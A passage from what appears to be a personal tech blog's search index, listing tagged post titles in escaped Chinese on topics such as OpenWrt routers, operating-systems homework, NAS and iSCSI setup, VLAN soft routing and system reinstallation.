<li>\u4f7f\u7528openwrt\u8def\u7531\u5668\u548cusb\u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71</li> </ul>"},{"location":"tags/#\u64cd\u4f5c\u7cfb\u7edf","title":"\u64cd\u4f5c\u7cfb\u7edf","text":"<ul> <li>\u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter1 \u4f5c\u4e1a</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter2 \u4f5c\u4e1a</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter3 \u4f5c\u4e1a</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u6982\u5ff5 chapter4 \u4f5c\u4e1a</li> <li>\u64cd\u4f5c\u7cfb\u7edf \u7b2c\u4e94\u7ae0\u4f5c\u4e1a CPU\u8c03\u5ea6</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u516d\u7ae0\u4f5c\u4e1a \u8fdb\u7a0b\u540c\u6b65</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e03\u7ae0\u4f5c\u4e1a \u6b7b\u9501</li> </ul>"},{"location":"tags/#\u6697\u5f71\u9a91\u58eb2","title":"\u6697\u5f71\u9a91\u58eb2","text":"<ul> <li>\u66f4\u65b0\u56fa\u6001\u4e4b\u65c5</li> </ul>"},{"location":"tags/#\u6e38\u620f\u623f","title":"\u6e38\u620f\u623f","text":"<ul> <li>\u865a\u62df\u6e38\u620f\u623f</li> </ul>"},{"location":"tags/#\u7535\u89c6","title":"\u7535\u89c6","text":"<ul> <li>\u5c0f\u7c73\u7535\u89c6\u8bbf\u95ee\u7535\u8111\u89c6\u9891</li> </ul>"},{"location":"tags/#\u7cfb\u7edf\u8fc1\u79fb","title":"\u7cfb\u7edf\u8fc1\u79fb","text":"<ul> <li>linux\u7cfb\u7edf\u8fc1\u79fb</li> </ul>"},{"location":"tags/#\u7ec4\u6210\u539f\u7406","title":"\u7ec4\u6210\u539f\u7406","text":"<ul> <li>\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406 \u7b2c\u4e00\u7ae0\u4f5c\u4e1a</li> </ul>"},{"location":"tags/#\u7f16\u8bd1\u539f\u7406","title":"\u7f16\u8bd1\u539f\u7406","text":"<ul> <li>\u7f16\u8bd1\u539f\u7406\u603b\u7ed3</li> </ul>"},{"location":"tags/#\u7f51\u6865","title":"\u7f51\u6865","text":"<ul> <li>Virtual Box\u914d\u7f6e\u53cc\u7f51\u5361</li> </ul>"},{"location":"tags/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"<ul> <li>NAS\u65e0\u6cd5\u626b\u63cf\u5230\u6d89\u53ca\u7684\u7f51\u7edc\u77e5\u8bc6</li> </ul>"},{"location":"tags/#\u7f51\u7edc\u6302\u8f7d","title":"\u7f51\u7edc\u6302\u8f7d","text":"<ul> <li>\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8(iSCSi)</li> </ul>"},{"location":"tags/#\u7f57\u5c0f\u9ed1","title":"\u7f57\u5c0f\u9ed1","text":"<ul> <li>\u7f57\u5c0f\u9ed1\u6218\u8bb0\uff0c\u7968\u623f\u51b2\u9e2d\uff01</li> </ul>"},{"location":"tags/#\u8f6f\u8def\u7531","title":"\u8f6f\u8def\u7531","text":"<ul> <li>VLAN\u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531</li> </ul>"},{"location":"tags/#\u91cd\u88c5\u7cfb\u7edf","title":"\u91cd\u88c5\u7cfb\u7edf","text":"<ul> <li>windows\u91cd\u88c5\u7cfb\u7edf\u6b65\u9aa4</li> </ul>"},{"location":"tags/#\u955c\u50cf","title":"\u955c\u50cf","text":"<ul> <li>openwrt x86\u5347\u7ea7</li> </ul>"}]}